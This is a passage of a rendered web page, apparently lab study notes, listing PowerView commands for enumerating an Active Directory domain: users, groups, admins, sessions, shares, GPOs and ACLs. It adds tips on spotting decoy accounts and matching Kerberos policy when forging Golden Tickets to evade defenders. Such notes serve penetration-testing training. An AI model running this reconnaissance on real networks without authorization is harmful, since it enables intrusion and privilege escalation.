</pre><td class="rouge-code"><pre><span class="n">Get-NetDomain</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain-name</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><h3 id="get-domain-sid-for-the-current-domain"><span class="mr-2">Get domain SID for the current domain</span><a href="#get-domain-sid-for-the-current-domain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-DomainSID</span><span class="w">
</span></pre></table></code></div></div><h3 id="get-domain-policy-for-the-current-domain"><span class="mr-2">Get domain policy for the current domain</span><a href="#get-domain-policy-for-the-current-domain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">Get-DomainPolicy</span><span class="w">
</span><span class="p">(</span><span class="n">Get-DomainPolicy</span><span class="p">)</span><span class="o">.</span><span class="s2">"system access"</span><span class="w">
</span></pre></table></code></div></div><h3 id="get-domain-policy-for-another-domain"><span class="mr-2">Get domain policy for another domain</span><a href="#get-domain-policy-for-another-domain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="p">(</span><span class="n">Get-DomainPolicy</span><span class="w"> </span><span class="nt">-domain</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain-name</span><span class="err">&gt;</span><span class="p">)</span><span class="o">.</span><span class="s2">"system access"</span><span class="w">
</span><span class="p">(</span><span class="n">Get-DomainPolicy</span><span class="w"> </span><span class="nt">-domain</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain-name</span><span class="err">&gt;</span><span class="p">)</span><span class="o">.</span><span class="s2">"kerberos policy"</span><span class="w">
</span><span class="p">(</span><span class="n">Get-DomainPolicy</span><span class="w"> </span><span class="nt">-domain</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain-name</span><span class="err">&gt;</span><span class="p">)</span><span class="o">.</span><span class="s2">"Privilege Rights"</span><span class="w">
</span><span class="c"># OR</span><span class="w">
</span><span class="p">(</span><span class="n">Get-DomainPolicy</span><span class="p">)</span><span class="o">.</span><span class="s2">"KerberosPolicy"</span><span class="w"> </span><span class="c">#Kerberos tickets info(MaxServiceAge)</span><span class="w">
</span><span class="p">(</span><span class="n">Get-DomainPolicy</span><span class="p">)</span><span class="o">.</span><span class="s2">"SystemAccess"</span><span class="w"> </span><span class="c">#Password policy</span><span class="w">
</span><span class="p">(</span><span class="n">Get-DomainPolicy</span><span class="p">)</span><span class="o">.</span><span class="nf">PrivilegeRights</span><span class="w"> </span><span class="c">#Check your privileges</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-danger"><div><p>Keep note of the kerberos policy as it will be required while making Golden Tickets using mimikats will require the same offsets else it will get blocked by the defenders</p></div></blockquote><h3 id="get-domain-controllers-for-the-current-domain"><span class="mr-2">Get domain controllers for the current domain</span><a href="#get-domain-controllers-for-the-current-domain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-NetDomainController</span><span class="w">
</span></pre></table></code></div></div><h3 id="get-domain-controllers-for-another-domain"><span class="mr-2">Get domain controllers for another domain</span><a href="#get-domain-controllers-for-another-domain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-NetDomainController</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain-name</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><h3 id="get-a-list-of-users-in-the-current-domain"><span class="mr-2">Get a list of users in the current domain</span><a href="#get-a-list-of-users-in-the-current-domain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">Get-NetUser</span><span class="w">
</span><span class="nx">Get-NetUser</span><span class="w"> </span><span class="nt">-Username</span><span class="w"> </span><span class="nx">student1</span><span class="w">
</span></pre></table></code></div></div><h3 id="get-list-of-all-properties-for-users-in-the-current-domain"><span class="mr-2">Get list of all properties for users in the current domain</span><a href="#get-list-of-all-properties-for-users-in-the-current-domain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">Get-UserProperty</span><span class="w">
</span><span class="nx">Get-UserProperty</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">pwdlastset</span><span class="p">,</span><span class="nx">logoncount</span><span class="p">,</span><span class="nx">badpwdcount</span><span class="w">
</span><span class="n">Get-UserProperty</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">logoncount</span><span class="w">
</span><span class="n">Get-UserProperty</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">badpwdcount</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-warning"><div><p>If the logon count and the bad password count of a user is tending to 0 it might be a decoy account. If the password last set of a user was also long back it might be a <strong>decoy account</strong></p></div></blockquote><h3 id="search-for-a-particular-string-in-a-users-attributes"><span class="mr-2">Search for a particular string in a user’s attributes</span><a href="#search-for-a-particular-string-in-a-users-attributes" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Find-UserField</span><span class="w"> </span><span class="nt">-SearchField</span><span class="w"> </span><span class="nx">Description</span><span class="w"> </span><span class="nt">-SearchTerm</span><span class="w"> </span><span class="s2">"built"</span><span class="w">
</span></pre></table></code></div></div><h3 id="get-a-list-of-computers-in-the-current-domain"><span class="mr-2">Get a list of computers in the current domain</span><a href="#get-a-list-of-computers-in-the-current-domain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">Get-NetComputer</span><span class="w">
</span><span class="nx">Get-NetComputer</span><span class="w"> </span><span class="nt">-OperatingSystem</span><span class="w"> </span><span class="s2">"*Server 2016*"</span><span class="w">
</span><span class="n">Get-NetComputer</span><span class="w"> </span><span class="nt">-Ping</span><span class="w">
</span><span class="n">Get-NetComputer</span><span class="w"> </span><span class="nt">-FullData</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Any computer administrator can create a computer object in the domain which is not an actual computer/Virtual-Machine but its object type is a computer</p></div></blockquote><h3 id="get-all-the-groups-in-the-current-domain"><span class="mr-2">Get all the groups in the current domain</span><a href="#get-all-the-groups-in-the-current-domain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">Get-NetGroup</span><span class="w">
</span><span class="nx">Get-NetGroup</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">targetdomain</span><span class="err">&gt;</span><span class="w">
</span><span class="n">Get-NetGroup</span><span class="w"> </span><span class="nt">-FullData</span><span class="w">
</span><span class="n">Get-NetComputer</span><span class="w"> </span><span class="nt">-Domain</span><span class="w">
</span></pre></table></code></div></div><h3 id="get-all-groups-containing-the-word-admin-in-group-name"><span class="mr-2">Get all groups containing the word “admin” in group name</span><a href="#get-all-groups-containing-the-word-admin-in-group-name" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">Get-NetGroup</span><span class="w"> </span><span class="o">*</span><span class="nx">admin</span><span class="o">*</span><span class="w">
</span><span class="n">Get-NetGroup</span><span class="w"> </span><span class="nt">-GroupName</span><span class="w"> </span><span class="o">*</span><span class="nx">admin</span><span class="o">*</span><span class="w">
</span><span class="n">Get-NetGroup</span><span class="w"> </span><span class="o">*</span><span class="nx">admin</span><span class="o">*</span><span class="w"> </span><span class="nt">-FullData</span><span class="w">
</span><span class="n">Get-NetGroup</span><span class="w"> </span><span class="nt">-GroupName</span><span class="w"> </span><span class="o">*</span><span class="nx">admin</span><span class="o">*</span><span class="w"> </span><span class="nt">-Doamin</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain-name</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Groups like <strong>“Enterprise Admins”,”Enterprise Key Admins”,etc</strong> will not be displayed in the above commands unless the domain is not specified because it is only available on the domain controllers of the <strong>forest root</strong></p></div></blockquote><h3 id="get-all-the-members-of-the-domain-admins-group"><span class="mr-2">Get all the members of the Domain Admins group</span><a href="#get-all-the-members-of-the-domain-admins-group" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-NetGroupMember</span><span class="w"> </span><span class="nt">-GroupName</span><span class="w"> </span><span class="s2">"Domain Admins"</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Make sure to check the RID which is the last few charachters of the SID of the member-user as the name of the member-user might be different/changed but the RID is unique For example : It might be an Administrator account having a differnt/changed member-name but if you check the RID and it is “500” then it is an Administrator account</p></div></blockquote><h3 id="get-the-group-membership-for-a-user"><span class="mr-2">Get the group membership for a user</span><a href="#get-the-group-membership-for-a-user" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-NetGroup</span><span class="w"> </span><span class="nt">-UserName</span><span class="w"> </span><span class="s2">"student1"</span><span class="w">
</span></pre></table></code></div></div><h3 id="list-all-the-local-groups-on-a-machine-needs-administrator-privs-on-non-dc-machines"><span class="mr-2">List all the local groups on a machine (needs administrator privs on non-dc machines)</span><a href="#list-all-the-local-groups-on-a-machine-needs-administrator-privs-on-non-dc-machines" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-NetLocalGroup</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">servername</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-ListGroups</span><span class="w">
</span></pre></table></code></div></div><h3 id="get-members-of-all-the-local-groups-on-a-machine-needs-administrator-privs-on-non-dc-machines"><span class="mr-2">Get members of all the local groups on a machine (needs administrator privs on non-dc machines)</span><a href="#get-members-of-all-the-local-groups-on-a-machine-needs-administrator-privs-on-non-dc-machines" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-NetLocalGroup</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">servername</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w">
</span></pre></table></code></div></div><h3 id="get-actively-logged-users-on-a-computer-needs-local-admin-rights-on-the-target"><span class="mr-2">Get actively logged users on a computer (needs local admin rights on the target)</span><a href="#get-actively-logged-users-on-a-computer-needs-local-admin-rights-on-the-target" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-NetLoggedon</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">servername</span><span class="err">&gt;</span><span class="w"> 
</span></pre></table></code></div></div><h3 id="get-locally-logged-users-on-a-computer-needs-remote-registry-on-the-target---started-by-default-on-server-os"><span class="mr-2">Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)</span><a href="#get-locally-logged-users-on-a-computer-needs-remote-registry-on-the-target---started-by-default-on-server-os" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-LoggedonLocal</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">servername</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><h3 id="get-the-last-logged-user-on-a-computer-needs-administrative-rights-and-remote-registry-on-the-target"><span class="mr-2">Get the last logged user on a computer (needs administrative rights and remote registry on the target)</span><a href="#get-the-last-logged-user-on-a-computer-needs-administrative-rights-and-remote-registry-on-the-target" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-LastLoggedon</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">servername</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><h3 id="find-shares-on-hosts-in-current-domain"><span class="mr-2">Find shares on hosts in current domain.</span><a href="#find-shares-on-hosts-in-current-domain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-ShareFinder</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h3 id="find-sensitive-files-on-computers-in-the-domain"><span class="mr-2">Find sensitive files on computers in the domain</span><a href="#find-sensitive-files-on-computers-in-the-domain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-FileFinder</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h3 id="get-all-fileservers-of-the-domain"><span class="mr-2">Get all fileservers of the domain</span><a href="#get-all-fileservers-of-the-domain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-NetFileServer</span><span class="w">
</span></pre></table></code></div></div><h1 id="gpo-enumeration">GPO Enumeration</h1><p>Group Policy provides the ability to manage configuration and changes easily and centrally in AD.</p><p>Allows configuration of :</p><ul><li>Security settings<li>Registry-based policy settings<li>Group policy preferences like startup/shutdown/log-on/logoff scripts settings<li>Software installation</ul><p>GPO can be abused for various attacks like privesc, backdoors, persistence etc.</p><h2 id="powerview-enumeration-1"><span class="mr-2">PowerView Enumeration</span><a href="#powerview-enumeration-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="get-list-of-gpo-in-current-domain"><span class="mr-2">Get list of GPO in current domain.</span><a href="#get-list-of-gpo-in-current-domain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">Get-NetGPO</span><span class="w">
</span><span class="nx">Get-NetGPO</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-student1.dollarcorp.moneycorp.local</span><span class="w">
</span><span class="n">Get-GPO</span><span class="w"> </span><span class="nt">-All</span><span class="w"> </span><span class="p">(</span><span class="n">GroupPolicy</span><span class="w"> </span><span class="nx">module</span><span class="p">)</span><span class="w">
</span><span class="n">Get-GPResultantSetOfPolicy</span><span class="w"> </span><span class="nt">-ReportType</span><span class="w"> </span><span class="nx">Html</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\Users\Administrator\report.html</span><span class="w"> </span><span class="p">(</span><span class="n">Provides</span><span class="w"> </span><span class="nx">RSoP</span><span class="p">)</span><span class="w">
</span><span class="n">gpresult</span><span class="w"> </span><span class="nx">/R</span><span class="w"> </span><span class="nx">/V</span><span class="w"> </span><span class="p">(</span><span class="n">GroupPolicy</span><span class="w"> </span><span class="nx">Results</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">current</span><span class="w"> </span><span class="nx">machine</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><h3 id="get-gpos-which-use-restricted-groups-or-groupsxml-for-interesting-users"><span class="mr-2">Get GPO(s) which use Restricted Groups or groups.xml for interesting users</span><a href="#get-gpos-which-use-restricted-groups-or-groupsxml-for-interesting-users" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-NetGPOGroup</span><span class="w"> 
</span></pre></table></code></div></div><h3 id="get-users-which-are-in-a-local-group-of-a-machine-using-gpo"><span class="mr-2">Get users which are in a local group of a machine using GPO</span><a href="#get-users-which-are-in-a-local-group-of-a-machine-using-gpo" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Find-GPOComputerAdmin</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">student1.dollarcorp.moneycorp.local</span><span class="w">
</span></pre></table></code></div></div><h3 id="get-machines-where-the-given-user-is-member-of-a-specific-group"><span class="mr-2">Get machines where the given user is member of a specific group</span><a href="#get-machines-where-the-given-user-is-member-of-a-specific-group" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Find-GPOLocation</span><span class="w"> </span><span class="nt">-Username</span><span class="w"> </span><span class="nx">student1</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h3 id="get-ous-in-a-domain"><span class="mr-2">Get OUs in a domain</span><a href="#get-ous-in-a-domain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">Get-NetOU</span><span class="w"> </span><span class="nt">-FullData</span><span class="w">
</span><span class="n">Get-NetOU</span><span class="w"> </span><span class="nx">StudentMachines</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="n">Get-NetComputer</span><span class="w"> </span><span class="nt">-ADSPath</span><span class="w"> </span><span class="bp">$_</span><span class="p">}</span><span class="w">  </span><span class="c"># Get all computers inside an OU (StudentMachines in this case)</span><span class="w">
</span></pre></table></code></div></div><h3 id="get-gpo-applied-on-an-ou-read-gponame-from-gplink-attribute-from-get-netou"><span class="mr-2">Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU</span><a href="#get-gpo-applied-on-an-ou-read-gponame-from-gplink-attribute-from-get-netou" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">Get-NetGPO</span><span class="w"> </span><span class="nt">-GPOname</span><span class="w"> </span><span class="s2">"{AB306569-220D-43FF-BO3B-83E8F4EF8081}"</span><span class="w">
</span><span class="n">Get-GPO</span><span class="w"> </span><span class="nt">-Guid</span><span class="w"> </span><span class="nx">AB306569-220D-43FF-B03B-83E8F4EF8081</span><span class="w"> </span><span class="p">(</span><span class="n">GroupPolicy</span><span class="w"> </span><span class="nx">module</span><span class="p">)</span><span class="w"> 
</span></pre></table></code></div></div><h3 id="enumerate-permissions-for-gpos-where-users-with-rids-of---1000-have-some-kind-of-modificationcontrol-rights"><span class="mr-2">Enumerate permissions for GPOs where users with RIDs of &gt; -1000 have some kind of modification/control rights</span><a href="#enumerate-permissions-for-gpos-where-users-with-rids-of---1000-have-some-kind-of-modificationcontrol-rights" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">Get-DomainObjectAcl</span><span class="w"> </span><span class="nt">-LDAPFilter</span><span class="w"> </span><span class="s1">'(objectCategory=groupPolicyContainer)'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">SecurityIdentifier</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'^S-1-5-.*-[1-9]\d{3,}$'</span><span class="p">)</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="p">(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">ActiveDirectoryRights</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner'</span><span class="p">)}</span><span class="w">
</span><span class="n">Get-NetGPO</span><span class="w"> </span><span class="nt">-GPOName</span><span class="w"> </span><span class="s1">'{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}'</span><span class="w"> 
</span></pre></table></code></div></div><h1 id="acl-enumeration">ACL Enumeration</h1><p>The <strong>Access Control Model</strong> enables control on the ability of a process to access objects and other resources in active directory based on:</p><ul><li>Access Tokens (security context of a process — identity and privs of user)<li>Security Descriptors (SID of the owner, Discretionary ACL (DACL) and System ACL (SACL))<li>It is a list of Access Control Entries (ACE) — ACE corresponds to individual permission or audits access. Who has permission and what can be done on an object?<li>Two types:<ul><li>DACL : Defines the permissions trustees (a user or group) have on an object.<li>SACL : Logs success and failure audit messages when an object is accessed.</ul><li>ACLs are vital to security architecture of AD.</ul><h2 id="powerview-enumeration-2"><span class="mr-2">PowerView Enumeration</span><a href="#powerview-enumeration-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="get-the-acls-associated-with-the-specified-object"><span class="mr-2">Get the ACLs associated with the specified object</span><a href="#get-the-acls-associated-with-the-specified-object" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-ObjectAcl</span><span class="w"> </span><span class="nt">-SamAccountName</span><span class="w"> </span><span class="nx">student1</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w">
